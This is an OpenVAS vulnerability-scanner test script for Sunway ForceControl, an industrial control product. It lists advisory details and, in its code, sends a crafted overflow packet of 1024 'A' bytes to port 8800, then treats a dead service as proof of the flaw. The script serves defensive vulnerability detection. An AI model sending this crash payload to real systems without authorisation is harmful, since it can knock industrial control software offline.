###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sunway_force_control_mult_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Sunway ForceControl Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802529");
  script_version("$Revision: 11997 $");
  script_bugtraq_id(49747);
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-12-02 13:55:52 +0530 (Fri, 02 Dec 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Sunway ForceControl Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46146");
  script_xref(name:"URL", value:"http://securitytracker.com/id/1026092");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/70015");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17885/");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/forcecontrol_1-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-266-01.pdf");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("find_service.nasl");
  script_require_ports(8800);
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
arbitrary code on the system or cause a denial of service condition.");
  script_tag(name:"affected", value:"Sunway ForceControl version 6.1 SP1, SP2 and SP3");
  script_tag(name:"insight", value:"Multiple flaws are caused due an,

  - Error in 'NetServer.exe' when processing certain packets can be exploited
  to disclose the contents of arbitrary files via directory traversal attack.

  - Error in 'AngelServer', Which fails to validate user-supplied input.

  - Error while processing certain packets in 'SNMP NetDBServer', leads to
  stack overflow or integer overflow in SNMP NetDBServer and execution of
  arbitrary code.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running Sunway ForceControl and is prone to multiple
vulnerabilities.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


port = 8800;
if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

r = crap(data:raw_string(0x41), length: 1024);
req = r + raw_string(0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
                     0x00, 0x00, 0xff, 0xff, 0xff, 0xff);

## Sending Attack
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

soc = open_sock_tcp(port);
if(!soc){
  security_message(port);
}
close(soc);
